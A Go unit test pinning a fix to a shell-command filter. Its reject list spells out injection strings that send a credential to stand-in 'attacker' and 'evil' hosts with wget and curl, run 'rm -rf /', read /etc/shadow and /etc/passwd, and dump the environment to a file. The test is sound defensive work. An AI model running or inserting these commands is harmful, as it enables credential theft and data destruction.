package sidecar

import "testing"

// TestContainsDangerousShellCharsAmpersandAndRedirect pins the credential-exfil
// shell-filter fix: a bare "&" (background operator = command separator in sh)
// and "<" (input redirect / process substitution / here-doc) must be rejected
// alongside the classic metacharacters, while a normal `printenv MYCRED`-style
// command that merely expands "$VAR" still passes.
func TestContainsDangerousShellCharsAmpersandAndRedirect(t *testing.T) {
	reject := []string{
		// The exploit from the audit: background a decoy, then exfil $MYCRED.
		`true & wget https://attacker/?d=$MYCRED`,
		`sleep 0 & curl http://evil/?d=x`,
		`curl http://x.test/?a=1&b=2`,
		// Input redirection / process substitution / here-doc.
		`sort < input.txt`,
		`cat <(curl http://evil/?d=x)`,
		`tr a b << EOF`,
		// Existing metacharacters must still be rejected.
		`ls; rm -rf /`,
		`curl x | cat`,
		`env > /tmp/leak`,
		"echo `whoami`",
		`echo $(whoami)`,
		`true && cat /etc/shadow`,
		`false || cat /etc/shadow`,
		"ls\nrm -rf /",
		"ls\rcat /etc/passwd",
	}
	for _, cmd := range reject {
		if !containsDangerousShellChars(cmd) {
			t.Errorf("containsDangerousShellChars(%q) = false; want rejected", cmd)
		}
	}

	allow := []string{
		// The intended use: read a credential from the environment.
		`printenv MYCRED`,
		`env`,
		`curl -H 'Authorization: Bearer $TOKEN' https://api.example.com`,
		// Metacharacters safely contained in single quotes stay allowed.
		`echo 'a & b'`,
		`echo 'a < b'`,
		`echo 'a;b|c>d'`,
	}
	for _, cmd := range allow {
		if containsDangerousShellChars(cmd) {
			t.Errorf("containsDangerousShellChars(%q) = true; want allowed", cmd)
		}
	}
}
